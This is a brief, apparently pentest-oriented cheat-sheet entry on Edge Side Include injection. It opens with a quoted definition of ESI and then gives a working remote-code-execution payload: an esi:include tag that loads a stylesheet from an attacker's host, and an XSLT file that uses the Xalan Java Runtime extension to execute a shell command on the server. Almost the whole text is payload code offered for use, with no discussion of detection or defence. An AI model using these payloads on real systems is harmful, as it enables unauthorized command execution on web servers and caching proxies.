# ESI

"The ESI language is based on a small set of XML tags and is used in many popular HTTP surrogate solutions to tackle performance issues by enabling heavy caching of Web content. ESI tags are used to instruct a reverse-proxy \(or a caching server\) to fetch more information about a web page for which a template is already cached. This information may come from another server before serving it to the client. This allows fully cached pages to include dynamic content." \([https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)\)

### RCE via XSL

```markup
<esi:include src="http://<ip>/" stylesheet="http://<ip>/esi.xsl"></esi:include>
```

```markup
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<xsl:variable name="cmd"><![CDATA[touch xct]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>
```



